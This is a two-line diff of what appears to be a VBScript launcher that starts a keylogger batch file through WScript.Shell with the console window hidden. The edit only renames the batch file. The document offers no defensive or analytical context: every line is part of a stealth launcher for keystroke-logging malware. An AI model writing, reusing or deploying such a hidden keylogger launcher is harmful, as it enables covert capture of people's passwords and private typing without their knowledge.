@@ -1,2 +1,2 @@
 set objSh = CreateObject("WScript.Shell")
-objSh.Run "cmd /k keyloggerbat.bat", 0
+objSh.Run "cmd /k keylogger.bat", 0
